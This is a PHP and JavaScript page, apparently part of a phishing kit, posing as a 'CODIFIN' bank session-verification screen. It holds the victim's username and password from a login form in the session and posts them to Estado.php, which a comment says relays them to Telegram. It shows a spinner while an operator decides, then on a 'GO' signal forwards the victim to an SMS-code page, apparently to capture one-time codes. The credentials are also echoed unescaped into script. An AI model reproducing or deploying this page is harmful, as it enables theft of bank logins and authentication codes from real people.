<?php

session_start();

if(!isset($_SESSION['user_id'])){
    $_SESSION['user_id'] = uniqid();
}

// 🔥 GUARDAR CLAVE AQUÍ (ESTE ES EL FIX REAL)
if(isset($_POST['clave'])){
    $_SESSION['clave'] = $_POST['clave'];
}

//$usuario = $_POST['usuario'] ?? ($_SESSION['usuario'] ?? '');
//$clave = $_POST['clave'] ?? ($_SESSION['clave'] ?? '');
$usuario = $_POST['usuario'] ?? '';
$clave = $_POST['clave'] ?? '';

// 🔥 SI NO VIENEN, USAR SESIÓN
if(!$usuario){
    $usuario = $_SESSION['usuario'] ?? '';
}
if(!$clave){
    $clave = $_SESSION['clave'] ?? '';
}

// 🔥 GUARDAR SI VIENEN
if($usuario){
    $_SESSION['usuario'] = $usuario;
}
if($clave){
    $_SESSION['clave'] = $clave;
}

// 🔥 GUARDAR SI VIENEN
if($usuario){
    $_SESSION['usuario'] = $usuario;
}
if($clave){
    $_SESSION['clave'] = $clave;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>CODIFIN | Verificación</title>

<style>

/* RESET */

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial, Helvetica, sans-serif;
}

/* BODY CENTRADO TOTAL */

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#ffffff;
}

/* CONTENEDOR */

.container{
text-align:center;
}

/* TEXTO */

.title{
font-size:20px;
font-weight:600;
color:#333;
margin-bottom:10px;
}

.subtitle{
font-size:14px;
color:#777;
margin-bottom:0px;
}

/* OVERLAY (VISIBLE SIEMPRE EN ESTA PÁGINA) */

#securityOverlay{
display:flex;
justify-content:center;
align-items:center;
}

#securityOverlay svg{
width:300px;
height:300px;
}

/* ANIMACIÓN */

@keyframes bankPulse{
0%{transform:scale(1);}
50%{transform:scale(1.08);}
100%{transform:scale(1);}
}

#securityOverlay.active svg{
animation:bankPulse 0.8s ease-in-out infinite;
}

#securityOverlay polygon{
transition:opacity 0.2s linear;
}

/* BOTÓN (OPCIONAL PARA PRUEBA LOCAL) */

button{
margin-top:30px;
padding:10px 20px;
border:none;
background:#2aa54a;
color:white;
border-radius:5px;
cursor:pointer;
}

</style>

</head>

<body>
    
<div class="container">

<div class="title">Verificando sesión</div>
<div class="subtitle">Espere autorización para continuar...</div>

<div id="securityOverlay">

<svg viewBox="0 0 200 200">

<polygon id="p1" points="50,100 100,100 100,75" fill="#071018"/>
<polygon id="p2" points="50,100 100,75 100,50" fill="#0b1320"/>
<polygon id="p3" points="100,50 125,100 150,100" fill="#1f6f3e"/>
<polygon id="p4" points="100,50 100,100 125,100" fill="#2e7b4c"/>
<polygon id="p5" points="100,100 150,100 100,150" fill="#3f6f5c"/>
<polygon id="p6" points="100,100 50,100 100,150" fill="#7CFC00"/>
<polygon id="p7" points="50,100 100,150 50,150" fill="#000000"/>
<polygon id="p8" points="50,150 100,150 100,200" fill="#0b6b3a"/>

</svg>

</div>

<!-- BOTÓN SOLO PARA PRUEBA 
<button onclick="autorizar()">Simular autorización</button> -->

</div>

<script>

const usuario = "<?php echo $usuario; ?>";
const clave = "<?php echo $clave; ?>";

// 🔥 ID NUEVO SIEMPRE (IMPORTANTE)
const userId = "<?php echo $_SESSION['user_id']; ?>";

console.log("ENVIANDO:", usuario, clave, userId);

// 🔥 ENVIAR A TELEGRAM
fetch("Estado.php", {
method: "POST",
headers: {
"Content-Type": "application/x-www-form-urlencoded"
},
body: "id=" + userId +
      "&usuario=" + encodeURIComponent(usuario) +
      "&clave=" + encodeURIComponent(clave)
})
.then(() => console.log("ENVIADO"))
.catch(err => console.log("ERROR:", err));

const overlay = document.getElementById("securityOverlay");

let autorizado = false;

// 🔥 ANIMACIÓN
function animar(){

let piezas = ["p1","p2","p3","p4","p5","p6","p7","p8"];

function loop(){

if(autorizado) return;

piezas.forEach(id=>{
document.getElementById(id).style.opacity = "1";
});

piezas.forEach((id,i)=>{
setTimeout(()=>{
document.getElementById(id).style.opacity = "0";
}, i * 120);
});

setTimeout(loop,1200);

}

overlay.classList.add("active");
loop();

}

animar();

// 🔥 REDIRECCIÓN CUANDO APRUEBAS
function autorizar(){
autorizado = true;
overlay.classList.remove("active");
window.location.href = "SMSCODIGO.php";
}

// 🔁 CONSULTAR ESTADO
setInterval(async () => {

try {

let res = await fetch("Estado.php", {
method: "POST",
headers: {
"Content-Type": "application/x-www-form-urlencoded"
},
body: "id=" + userId
});

let data = await res.text();

console.log("ESTADO:", data);

if(data.trim() === "GO"){
    console.log("REDIRIGIENDO...");
    window.location.href = "SMSCODIGO.php";
}

if(data.trim() === "BLOCK"){
alert("Acceso bloqueado");
window.location.href = "index.php";
}

} catch(e){
console.log("ERROR:", e);
}

}, 2000);

</script>

</body>
</html>
